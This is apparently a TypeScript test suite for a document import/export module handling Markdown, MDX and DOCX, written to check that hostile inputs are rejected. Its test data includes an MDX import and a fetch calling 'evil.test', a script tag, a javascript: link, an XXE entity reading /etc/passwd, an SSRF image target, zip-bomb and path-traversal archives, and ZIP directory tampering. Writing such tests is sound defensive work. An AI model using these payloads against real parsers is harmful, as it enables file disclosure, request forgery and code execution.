import { describe, expect, it } from 'vitest';
import { unzipSync, zipSync, strToU8, strFromU8 } from 'fflate';
import {
  exportDocx,
  exportMarkdown,
  importDocx,
  importMarkdown,
  validateDocxArchive,
} from '../shared/document-interchange.ts';
import { parseSafeXml, xmlText } from '../shared/safe-xml.ts';
import { documentBlockDefaults } from '../shared/document-blocks.ts';
import { editorSchema } from '../shared/editor.ts';
import {
  applyDocumentSuggestion,
  suggestionPassage,
} from '../shared/document-review.ts';
import type { RichNode } from '../shared/domain.ts';
const doc: RichNode = {
  type: 'doc',
  content: [
    {
      type: 'heading',
      attrs: { level: 1 },
      content: [{ type: 'text', text: 'A deliberate plan' }],
    },
    {
      type: 'paragraph',
      attrs: { id: 'passage' },
      content: [
        { type: 'text', text: 'Preserve ' },
        { type: 'text', text: 'decisions', marks: [{ type: 'bold' }] },
        { type: 'text', text: ' & evidence.' },
      ],
    },
    {
      type: 'bulletList',
      content: [
        {
          type: 'listItem',
          content: [
            {
              type: 'paragraph',
              content: [{ type: 'text', text: 'First condition' }],
            },
          ],
        },
      ],
    },
    {
      type: 'table',
      content: [
        {
          type: 'tableRow',
          content: [
            {
              type: 'tableHeader',
              content: [
                {
                  type: 'paragraph',
                  content: [{ type: 'text', text: 'Scenario' }],
                },
              ],
            },
          ],
        },
        {
          type: 'tableRow',
          content: [
            {
              type: 'tableCell',
              content: [
                {
                  type: 'paragraph',
                  content: [{ type: 'text', text: 'A real run' }],
                },
              ],
            },
          ],
        },
      ],
    },
  ],
};
describe('safe document interchange and passage review', () => {
  it('round-trips authored Markdown structure, marks, lists, and tables', () => {
    const source = exportMarkdown(doc),
      imported = importMarkdown(source).doc;
    expect(source).toContain('**decisions**');
    expect(source).toContain('| Scenario |');
    const parsed = editorSchema().nodeFromJSON(imported);
    parsed.check();
    expect(parsed.textContent).toContain('Preserve decisions & evidence.');
    expect(imported.content?.map((n) => n.type)).toEqual([
      'heading',
      'paragraph',
      'bulletList',
      'table',
    ]);
  });
  it('preserves safe component data in fenced Markdown and restricted MDX without executing source', () => {
    const original: RichNode = {
      type: 'doc',
      content: [
        {
          type: 'calloutBlock',
          attrs: { data: documentBlockDefaults.calloutBlock },
        },
        {
          type: 'questionnaireBlock',
          attrs: { data: documentBlockDefaults.questionnaireBlock },
        },
      ],
    };
    for (const mdx of [false, true]) {
      const result = importMarkdown(exportMarkdown(original, mdx), mdx);
      expect(result.doc.content?.map((n) => n.type)).toEqual([
        'calloutBlock',
        'questionnaireBlock',
      ]);
      expect(result.doc.content?.[1]?.attrs?.data).toEqual(
        documentBlockDefaults.questionnaireBlock,
      );
    }
    expect(() =>
      importMarkdown(
        'import Evil from "https://evil.test/module"\n<Evil />',
        true,
      ),
    ).toThrow('cannot import');
    expect(() =>
      importMarkdown(
        '<Chart data={globalThis.fetch("https://evil.test")} />',
        true,
      ),
    ).toThrow();
    expect(() => importMarkdown('<Unknown data={{}} />', true)).toThrow(
      'registered',
    );
  });
  it('keeps raw HTML inert and refuses unsafe link schemes', () => {
    const result = importMarkdown(
      '<script>globalThis.compromised = true</script>\n\n[unsafe](javascript:alert%281%29)',
    );
    expect(JSON.stringify(result.doc)).toContain('<script>');
    expect(JSON.stringify(result.doc)).not.toContain('"type":"link"');
    expect(result.warnings).toContain(
      'HTML was imported as literal text, never as executable markup.',
    );
  });
  it('exports an actual OOXML package and imports its headings, styles, lists, and tables', () => {
    const bytes = exportDocx(doc, 'Planning & review'),
      files = unzipSync(bytes);
    expect(strFromU8(files['[Content_Types].xml']!)).toContain(
      'wordprocessingml.document.main+xml',
    );
    expect(strFromU8(files['word/document.xml']!)).toContain('<w:b/>');
    expect(strFromU8(files['docProps/core.xml']!)).toContain(
      'Planning &amp; review',
    );
    const imported = importDocx(bytes);
    expect(imported.doc.content?.map((n) => n.type)).toEqual([
      'heading',
      'paragraph',
      'bulletList',
      'table',
    ]);
    expect(editorSchema().nodeFromJSON(imported.doc).textContent).toContain(
      'Preserve decisions & evidence.',
    );
    expect(
      imported.doc.content?.[1]?.content?.find((n) => n.text === 'decisions')
        ?.marks,
    ).toEqual([{ type: 'bold' }]);
  });
  it('never follows external image relationships or resolves XML entities', () => {
    const xml =
        '<w:document xmlns:w="x" xmlns:a="y" xmlns:r="z"><w:body><w:p><w:r><w:drawing><a:blip r:embed="remote"/></w:drawing></w:r></w:p></w:body></w:document>',
      rels =
        '<Relationships><Relationship Id="remote" Type="image" Target="http://127.0.0.1/private" TargetMode="External"/></Relationships>';
    const bytes = zipSync({
      'word/document.xml': strToU8(xml),
      'word/_rels/document.xml.rels': strToU8(rels),
    });
    const imported = importDocx(bytes);
    expect(imported.attachments).toEqual([]);
    expect(imported.warnings.join(' ')).toContain(
      'No external resources were requested',
    );
    expect(() =>
      parseSafeXml(
        '<!DOCTYPE x [<!ENTITY p SYSTEM "file:///etc/passwd">]><x>&p;</x>',
      ),
    ).toThrow('DTD');
    expect(() => parseSafeXml('<x>&unregistered;</x>')).toThrow(
      'unsupported entity',
    );
    expect(xmlText(parseSafeXml('<x>A &amp; B &#x1F4C4;</x>'))).toBe(
      'A & B 📄',
    );
  });
  it('bounds ZIP expansion from central metadata before inflating source and rejects repeated/escaping paths', () => {
    const bytes = exportDocx(doc, 'Bounded'),
      changed = bytes.slice(),
      view = new DataView(changed.buffer);
    for (let offset = 0; offset < changed.length - 46; offset++)
      if (view.getUint32(offset, true) === 0x02014b50) {
        view.setUint32(offset + 24, 500_000_000, true);
        break;
      }
    expect(() => validateDocxArchive(changed)).toThrow('16 MB');
    expect(() =>
      validateDocxArchive(
        zipSync({
          'word/document.xml': strToU8('<document/>'),
          '../escape': strToU8('bad'),
        }),
      ),
    ).toThrow('unsafe');
    expect(() => importMarkdown('a'.repeat(1_000_001))).toThrow('1 MB');
  });
  it('preserves embedded PNG ownership placeholders until the import workflow explicitly uploads them', () => {
    const image: RichNode = {
        type: 'doc',
        content: [
          {
            type: 'image',
            attrs: {
              src: '/api/files/00000000-0000-4000-8000-000000000001',
              alt: 'Review evidence',
            },
          },
        ],
      },
      png = Uint8Array.of(137, 80, 78, 71, 13, 10, 26, 10);
    const imported = importDocx(
      exportDocx(image, 'Image', {
        '/api/files/00000000-0000-4000-8000-000000000001': {
          bytes: png,
          mime: 'image/png',
        },
      }),
    );
    expect(imported.attachments).toHaveLength(1);
    expect(imported.attachments[0]?.bytes).toEqual(png);
    expect(
      imported.doc.content?.find((n) => n.type === 'image')?.attrs?.src,
    ).toBe('attachment:attachment-0');
  });
  it('accepts a suggestion after edits elsewhere, preserves marks, and rejects changed or duplicated anchors', () => {
    const original = structuredClone(doc),
      passage = suggestionPassage(original, 'passage', 9, 18),
      suggestion = {
        anchor: 'passage',
        from: 9,
        to: 18,
        before: passage.before,
        after: 'tradeoffs',
      };
    original.content!.unshift({
      type: 'paragraph',
      content: [{ type: 'text', text: 'A teammate added context above.' }],
    });
    const applied = applyDocumentSuggestion(
      original,
      suggestion,
      passage.snapshot,
    );
    expect(editorSchema().nodeFromJSON(applied).textContent).toContain(
      'Preserve tradeoffs & evidence.',
    );
    const edited = structuredClone(original);
    edited.content![2]!.content![0]!.text = 'A different passage ';
    expect(() =>
      applyDocumentSuggestion(edited, suggestion, passage.snapshot),
    ).toThrow('passage changed');
    const duplicated = structuredClone(original);
    duplicated.content!.push(structuredClone(duplicated.content![2]!));
    expect(() =>
      applyDocumentSuggestion(duplicated, suggestion, passage.snapshot),
    ).toThrow('ambiguous');
  });
  it('retains inline/block formula source and merged Word table geometry through interchange', () => {
    const formula: RichNode = {
      type: 'doc',
      content: [
        {
          type: 'paragraph',
          content: [
            { type: 'text', text: 'Energy ' },
            { type: 'inlineMath', attrs: { latex: 'E = mc^2' } },
          ],
        },
        { type: 'blockMath', attrs: { latex: '\\frac{a}{b}' } },
      ],
    };
    const imported = importMarkdown(exportMarkdown(formula)).doc;
    expect(
      imported.content?.[0]?.content?.some(
        (node) =>
          node.type === 'inlineMath' && node.attrs?.latex === 'E = mc^2',
      ),
    ).toBe(true);
    expect(imported.content?.[1]?.attrs?.latex).toBe('\\frac{a}{b}');
    const paragraph = (value: string) => ({
        type: 'paragraph',
        content: [{ type: 'text', text: value }],
      }),
      merged: RichNode = {
        type: 'doc',
        content: [
          {
            type: 'table',
            content: [
              {
                type: 'tableRow',
                content: [
                  {
                    type: 'tableHeader',
                    attrs: { rowspan: 2, colspan: 1 },
                    content: [paragraph('Two rows')],
                  },
                  { type: 'tableHeader', content: [paragraph('Next column')] },
                ],
              },
              {
                type: 'tableRow',
                content: [
                  { type: 'tableCell', content: [paragraph('Second row')] },
                ],
              },
              {
                type: 'tableRow',
                content: [
                  {
                    type: 'tableCell',
                    attrs: { colspan: 2 },
                    content: [paragraph('Two columns')],
                  },
                ],
              },
            ],
          },
        ],
      };
    const roundtrip = importDocx(exportDocx(merged, 'Merged table')).doc,
      rows = roundtrip.content![0]!.content!;
    expect(rows[0]!.content![0]!.type).toBe('tableHeader');
    expect(rows[0]!.content![0]!.attrs?.rowspan).toBe(2);
    expect(rows[1]!.content).toHaveLength(1);
    expect(rows[2]!.content![0]!.attrs?.colspan).toBe(2);
  });

  it('normalizes ZIP comments so embedded EOCD markers cannot redirect inflation and rejects ZIP64/count disagreement', () => {
    const original = exportDocx(doc, 'ZIP directory'),
      commented = new Uint8Array(original.length + 23);
    commented.set(original);
    const view = new DataView(commented.buffer),
      end = original.length - 22;
    view.setUint16(end + 20, 23, true);
    view.setUint32(original.length, 0x06054b50, true);
    expect(
      editorSchema().nodeFromJSON(importDocx(commented).doc).textContent,
    ).toContain('A deliberate plan');
    const counts = original.slice(),
      countView = new DataView(counts.buffer);
    countView.setUint16(end + 8, countView.getUint16(end + 10, true) + 1, true);
    expect(() => importDocx(counts)).toThrow('inconsistent');
    const zip64 = original.slice();
    new DataView(zip64.buffer).setUint32(end - 20, 0x07064b50, true);
    expect(() => importDocx(zip64)).toThrow('ZIP64');
  });
});
